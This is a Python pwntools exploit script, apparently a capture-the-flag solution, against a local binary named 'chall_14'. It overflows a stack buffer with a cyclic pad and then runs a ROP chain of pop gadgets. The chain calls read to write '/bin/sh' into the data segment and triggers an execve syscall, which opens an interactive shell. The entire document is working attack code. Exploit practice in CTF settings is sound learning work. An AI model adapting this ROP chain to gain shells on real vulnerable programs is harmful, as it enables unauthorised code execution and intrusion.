from pwn import *

read_addr = 0x00449b00
data_segment = 0x006b90e0
syscall = 0x000000000040120c
pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410263
pop_rdx = 0x000000000044c086
pop_rax = 0x00000000004158f4

bin_sh = b'/bin/sh'

binary = ELF('./chall_14')
p = process('./chall_14')

# RELRO (libc? GOT?) PIE (GOT?) CANARY SO POSSIBLE BOF IF LEAK ELSE NO BOF (STATICALLY LINKED, SO EASY LIBC EXPLOIT)

# bypass initial fgets
p.sendline(b'junk')

# ryan's rule
offset = 0x60 + 0x8

# placeholder arg
zero_arg = p64(0x0)

payload = cyclic(offset) 
payload += p64(pop_rdi) + zero_arg + p64(pop_rsi) + p64(data_segment) + p64(pop_rdx) + p64(len(bin_sh)) # load args for read
payload += p64(p.elf.sym['read']) # call read
payload += p64(pop_rax) + p64(0x3b) # put execve syscall in rax
payload += p64(pop_rdi) + p64(data_segment) # put location of /bin/sh in rdi
payload += p64(pop_rsi) + zero_arg # set second arg to null
payload += p64(pop_rdx) + zero_arg # set third arg to null 
payload += p64(syscall)

log.info(f'Length of payload = {len(payload)}')

log.info('Sent payload')
p.sendline(payload)

log.info('Sending /bin/sh into data segment')
p.sendline(bin_sh)

log.info('Spawning shell')
p.interactive()
